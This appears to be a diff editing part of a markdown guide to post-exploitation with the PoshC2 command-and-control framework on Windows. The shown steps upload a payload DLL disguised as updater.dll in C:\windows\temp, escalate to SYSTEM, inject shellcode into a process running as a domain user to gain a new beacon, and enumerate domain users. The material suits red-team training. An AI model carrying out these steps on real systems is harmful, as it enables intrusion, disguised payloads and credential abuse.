@@ -80,7 +80,7 @@ Lets escalate to system through execution
 Upload a the dll to the machine 
 ```ps
 > upload-file 
-> /var/poshc2/projetname/payloads/Sharp_v4_x64.dll
+> Sharp_v4_x64.dll
 > location C:\windows\temp\updater.dll 
 ```
 
@@ -97,18 +97,18 @@ Once you are system you can Enumerate for other users on the box with domain acc
 ps
 ```
 
-Search for any user process being ran as a domain user, to inject into
+Search for any user process being ran as SYSTEM, to inject into.
 
 ```ps
 inject-shellcode <PID> 
 ```
 ```ps
-<name_of_shellcode.bin>
+Sharp_v4_Shellcode.dll
 ```
 
 Checking your ImplantHandler you should see a new beacon running in the context of said user.
 
-As a domain user you can now run domain level commands, you can check your groups and privileges 
+As a domain user you can now run domain level commands, you can check your groups and privileges.
 ``` 
 sharpps net user <domain username>
 ```
